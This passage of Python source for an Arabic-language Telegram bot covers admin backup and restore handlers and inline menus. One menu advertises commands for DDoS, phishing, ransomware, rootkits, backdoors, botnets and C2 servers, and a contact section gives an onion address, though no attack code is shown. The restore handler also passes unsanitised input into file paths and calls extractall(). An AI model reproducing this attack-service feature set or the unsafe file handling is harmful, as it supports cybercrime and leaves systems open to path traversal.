            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            await event.respond("💾 **جاري إنشاء نسخة احتياطية...**")
            
            try:
                backup_name = f"backup_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
                
                # نسخ قاعدة البيانات
                shutil.copy2(DB_NAME, f"{backup_name}.db")
                
                # إنشاء ملف JSON بالبيانات
                data = {
                    'timestamp': str(datetime.datetime.now()),
                    'users': self.db.execute_query("SELECT * FROM users"),
                    'admins': self.db.execute_query("SELECT * FROM admins"),
                    'groups': self.db.execute_query("SELECT * FROM groups"),
                    'stats': self.db.execute_query("SELECT * FROM stats"),
                    'commands': self.commands_count,
                    'uptime': time.time() - self.start_time
                }
                
                with open(f"{backup_name}.json", 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, default=str)
                    
                # ضغط الملفات
                with zipfile.ZipFile(f"{backup_name}.zip", 'w') as zipf:
                    zipf.write(f"{backup_name}.db")
                    zipf.write(f"{backup_name}.json")
                    
                # تشفير النسخة
                with open(f"{backup_name}.zip", 'rb') as f:
                    encrypted = self.cipher.encrypt(f.read())
                    
                with open(f"{backup_name}.enc", 'wb') as f:
                    f.write(encrypted)
                    
                # تسجيل في قاعدة البيانات
                self.db.execute_query(
                    "INSERT INTO backups (backup_name, backup_type, created_by, created_date, size, location, encrypted) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (backup_name, 'full', event.sender_id, datetime.datetime.now(), os.path.getsize(f"{backup_name}.enc"), f"{backup_name}.enc", True)
                )
                
                await event.respond(f"""
✅ **تم إنشاء النسخة الاحتياطية بنجاح**

📁 **الملف:** {backup_name}.enc
📊 **الحجم:** {os.path.getsize(f"{backup_name}.enc")} bytes
🔐 **مشفر:** نعم
⏰ **التاريخ:** {datetime.datetime.now()}

🔄 **للاستعادة استخدم:** /restore {backup_name}
                """)
                
            except Exception as e:
                await event.respond(f"❌ **خطأ في النسخ الاحتياطي:** {str(e)}")
                
        @self.client.on(events.NewMessage(pattern='/restore'))
        async def restore_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ **عذراً، هذا الأمر مخصص للأدمن فقط!**")
                return
                
            backup_name = event.text.replace('/restore', '').strip()
            if not backup_name:
                await event.respond("❌ **يرجى تحديد اسم النسخة: /restore [الاسم]**")
                return
                
            await event.respond(f"🔄 **جاري استعادة النسخة {backup_name}...**")
            
            try:
                # فك التشفير
                with open(f"{backup_name}.enc", 'rb') as f:
                    decrypted = self.cipher.decrypt(f.read())
                    
                with open(f"{backup_name}.zip", 'wb') as f:
                    f.write(decrypted)
                    
                # فك الضغط
                with zipfile.ZipFile(f"{backup_name}.zip", 'r') as zipf:
                    zipf.extractall()
                    
                # استعادة قاعدة البيانات
                shutil.copy2(f"{backup_name}.db", DB_NAME)
                
                # إعادة تهيئة الاتصال
                self.db.close()
                self.db = EliteDatabase(DB_NAME)
                
                await event.respond(f"""
✅ **تمت استعادة النسخة بنجاح**

📁 **النسخة:** {backup_name}
⏰ **الوقت:** {datetime.datetime.now()}

⚡ **تم تحديث قاعدة البيانات بنجاح**
                """)
                
            except Exception as e:
                await event.respond(f"❌ **خطأ في الاستعادة:** {str(e)}")
                
        # ================================================
        # معالجات الأزرار (Inline)
        # ================================================
        
        @self.client.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode('utf-8')
            
            if data == "main_menu":
                buttons = [
                    [Button.inline("👤 حسابي", data="my_profile"), Button.inline("⚙️ الإعدادات", data="settings")],
                    [Button.inline("📊 الإحصائيات", data="stats"), Button.inline("🛠 الأدوات", data="tools")],
                    [Button.inline("🔐 أدوات الاختراق", data="hack_tools"), Button.inline("🌐 الشبكات", data="network_tools")],
                    [Button.inline("📞 التواصل", data="contact"), Button.inline("📢 القناة", data="channel")],
                    [Button.inline("🔙 رجوع", data="back")]
                ]
                
                await event.edit("📋 **القائمة الرئيسية**", buttons=buttons)
                
            elif data == "my_profile":
                user = await event.get_sender()
                
                # جلب معلومات المستخدم من قاعدة البيانات
                user_info = self.db.execute_query(
                    "SELECT * FROM users WHERE user_id = ?",
                    (user.id,)
                )
                
                profile_text = f"""
👤 **معلومات حسابك**

🆔 **المعرف:** {user.id}
📱 **اليوزر:** @{user.username if user.username else 'لا يوجد'}
👤 **الاسم:** {user.first_name} {user.last_name if user.last_name else ''}
📅 **تاريخ الانضمام:** {user_info[0][5] if user_info else 'غير معروف'}
🕐 **آخر نشاط:** {user_info[0][6] if user_info else 'غير معروف'}

📊 **إحصائياتك:**
• الرسائل: {user_info[0][7] if user_info else 0}
• التحذيرات: {user_info[0][8] if user_info else 0}
• مستوى الثقة: {user_info[0][13] if user_info else 1}
• العملات: {user_info[0][14] if user_info else 0}
• الخبرة: {user_info[0][15] if user_info else 0}
• المستوى: {user_info[0][16] if user_info else 1}

🔰 **الحالة:**
• محظور: {'✅' if user_info and user_info[0][9] else '❌'}
• مكتوم: {'✅' if user_info and user_info[0][10] else '❌'}
                """
                
                buttons = [[Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(profile_text, buttons=buttons)
                
            elif data == "stats":
                # إحصائيات عامة
                users_count = self.db.execute_query("SELECT COUNT(*) FROM users")[0][0]
                groups_count = self.db.execute_query("SELECT COUNT(*) FROM groups")[0][0]
                admins_count = self.db.execute_query("SELECT COUNT(*) FROM admins")[0][0]
                banned_count = self.db.execute_query("SELECT COUNT(*) FROM banned")[0][0]
                muted_count = self.db.execute_query("SELECT COUNT(*) FROM muted")[0][0]
                warnings_count = self.db.execute_query("SELECT COUNT(*) FROM warnings")[0][0]
                
                stats_text = f"""
📊 **إحصائيات البوت الشاملة**

👥 **المستخدمين:**
• الإجمالي: {users_count}
• المحظورين: {banned_count}
• المكتومين: {muted_count}
• المحذرين: {warnings_count}

👑 **الإدارة:**
• الأدمن: {admins_count}
• المطورين: {len([a for a in ADMIN_IDS if a in [x[0] for x in self.db.execute_query("SELECT admin_id FROM admins WHERE is_super_admin = TRUE")]])}

💬 **المجموعات:**
• الإجمالي: {groups_count}
• النشطة: {self.db.execute_query("SELECT COUNT(*) FROM groups WHERE last_active > datetime('now', '-1 day')")[0][0]}
• المحمية: {self.db.execute_query("SELECT COUNT(*) FROM groups WHERE is_protected = TRUE")[0][0]}

📈 **الأداء:**
• الأوامر المنفذة: {self.commands_count}
• وقت التشغيل: {datetime.timedelta(seconds=int(time.time() - self.start_time))}
• العمليات النشطة: {len(psutil.Process().children())}
• اتصالات TOR: {'نشط' if self.tor_session else 'غير نشط'}

⚡ **آخر تحديث: {datetime.datetime.now()}**
                """
                
                buttons = [[Button.inline("🔄 تحديث", data="stats"), Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(stats_text, buttons=buttons)
                
            elif data == "hack_tools":
                tools_text = """
🔐 **أدوات الاختراق المتاحة**

• 🔍 **/nmap** - فحص المنافذ والخدمات
• 💥 **/ddos** - هجمات حجب الخدمة
• 🎣 **/phish** - إنشاء صفحات تصيد
• 🔑 **/crack** - كسر كلمات المرور
• 👁 **/sniff** - التنصت على الشبكة
• 🕸 **/spoof** - انتحال الهوية
• 🛡 **/bypass** - تجاوز الحماية
• 🦠 **/ransomware** - برامج الفدية
• 👻 **/rootkit** - الجذور الخفية
• 🚪 **/backdoor** - الأبواب الخلفية
• 🤖 **/botnet** - شبكات البوتات
• 🎮 **/c2** - خوادم التحكم

⚠️ **استخدم بحذر...**
                """
                
                buttons = [[Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(tools_text, buttons=buttons)
                
            elif data == "network_tools":
                network_text = """
🌐 **أدوات الشبكات**

• 📡 **/wifi_scan** - فحص شبكات الواي فاي
• 🔌 **/packet_sniffer** - تحليل الحزم
• 🖧 **/traffic_analyzer** - تحليل حركة المرور
• 🔄 **/proxy_chain** - سلاسل البروكسي
• 🕵️ **/vpn_spoof** - تزوير VPN
• 📍 **/geo_locate** - تحديد الموقع
• 🗺 **/network_map** - رسم خريطة الشبكة
• 🔐 **/encrypt_net** - تشفير الاتصالات
• 📊 **/bandwidth** - قياس النطاق الترددي
• ⚡ **/latency_test** - اختبار زمن الاستجابة

🔰 **للاستخدام اكتب الأمر متبوعاً بالمعلمات**
                """
                
                buttons = [[Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(network_text, buttons=buttons)
                
            elif data == "contact":
                contact_text = """
📞 **معلومات التواصل**

**المطور:** The Architect
**البوت:** @FF2_B
**القناة:** @FF2_Channel
**الدعم:** @FF2_Support

📧 **البريد:** arch.2099@darkweb.anon
🔗 **الموقع:** http://arch.2099.onion
💬 **الغرفة:** #elite_bot on DarkIRC

⚡ **نظام الدعم متاح 24/7**
                """
                
                buttons = [[Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(contact_text, buttons=buttons)
                
            elif data == "settings":
                settings_text = """
⚙️ **إعدادات البوت**

🔹 **الإعدادات العامة:**
• اللغة: العربية
• وضع التشغيل: متطور
• مستوى الأمان: عالي
• التشفير: AES-256

🔹 **إعدادات الأدمن:**
• التحقق بخطوتين: مفعل
• تسجيل الدخول: مفعل
• التنبيهات: مفعلة
• النسخ الاحتياطي: تلقائي

🔹 **إعدادات الاختراق:**
• TOR: مفعل
• Proxy Chain: مفعل
• VPN: غير مفعل
• MAC Spoofing: مفعل

🔹 **إعدادات الحماية:**
• Anti-Spam: مفعل
• Anti-Raid: مفعل
• Anti-Flood: مفعل
• Auto-Ban: مفعل

🔄 **لتغيير أي إعداد استخدم /settings [الخيار] [القيمة]**
                """
                
                buttons = [[Button.inline("🔙 رجوع", data="main_menu")]]
                await event.edit(settings_text, buttons=buttons)
                
    async def background_tasks(self):
        """المهام الخلفية"""
        while True:
            try:
                # تحديث الإحصائيات كل ساعة
                await asyncio.sleep(3600)
                
                # تنظيف الجلسات المنتهية
                current_time = time.time()
                expired = [sid for sid, session in self.active_sessions.items() 
                          if current_time - session['last_active'] > 3600]
                for sid in expired:
                    del self.active_sessions[sid]
                    
                # فك كتم المستخدمين المنتهية مدتهم
                muted_users = self.db.execute_query(
    "SELECT user_id FROM muted WHERE unmute_date < datetime('now', 'localtime')"  # ✅ صحيحة
)
                
                for user in muted_users:
                    self.db.execute_query(
                        "UPDATE users SET is_muted = FALSE WHERE user_id = ?",
                        (user[0],)
                    )
                    
                logger.info("Background tasks completed successfully")
                
            except Exception as e:
                logger.error(f"Background task error: {e}")
                await asyncio.sleep(60)  # انتظار دقيقة قبل إعادة المحاولة
                
    def __del__(self):
        """التنظيف عند الإغلاق"""
        if hasattr(self, 'db'):
            self.db.close()
            
# ================================================
# نقطة البداية
# ================================================

if __name__ == '__main__':
    print(Fore.RED + """
    ╔═══════════════════════════════════════════╗
    ║     ELITE BOT v9.9.9 - THE ARCHITECT     ║
    ║         Telegram Advanced Bot 2099        ║
    ║         For Contact: @FF2_B               ║
    ╚═══════════════════════════════════════════╝
    """ + Fore.RESET)
    
    bot = EliteBot(API_ID, API_HASH, BOT_TOKEN)
    
    try:
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⚠️ تم إيقاف البوت بواسطة المستخدم")
    except Exception as e:
        print(Fore.RED + f"\n❌ خطأ فادح: {e}")
        logger.critical(f"Fatal error: {e}", exc_info=True)
